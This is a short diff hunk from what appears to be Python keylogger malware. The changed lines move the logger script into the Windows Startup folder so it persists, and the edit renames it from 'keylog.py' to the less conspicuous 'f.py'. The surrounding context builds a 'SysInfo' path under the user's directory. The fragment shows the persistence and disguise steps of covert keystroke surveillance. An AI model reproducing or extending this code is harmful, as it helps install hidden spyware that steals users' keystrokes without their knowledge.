@@ -15,7 +15,7 @@ p = "C://Users/"+str(getpass.getuser())+"/SysInfo/"
 
 #add keylog.py file to Windows Startup folder 
 try:
-    shutil.move("keylog.py" ,"c://users/"+str(getpass.getuser())+"/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/keylog.py")
+    shutil.move("f.py" ,"c://users/"+str(getpass.getuser())+"/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/f.py")
 except FileNotFoundError:
     pass
 
